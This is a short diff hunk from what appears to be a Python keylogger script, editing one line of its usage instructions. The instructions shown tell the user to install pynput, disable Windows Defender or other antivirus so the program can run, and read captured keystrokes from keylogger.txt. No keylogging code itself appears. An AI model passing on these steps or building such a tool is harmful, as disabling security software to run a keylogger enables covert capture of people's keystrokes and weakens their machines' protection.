@@ -19,7 +19,7 @@ if __name__=="__main__":
 #Instructions:
     """
     1. pip install pynput
-    2. write code in python
+    2. write code in python test
     3. disable windows defender or anti-virus so that our program can run ;)
     4. check keylogger.txt for output
     Let's  how this works"""
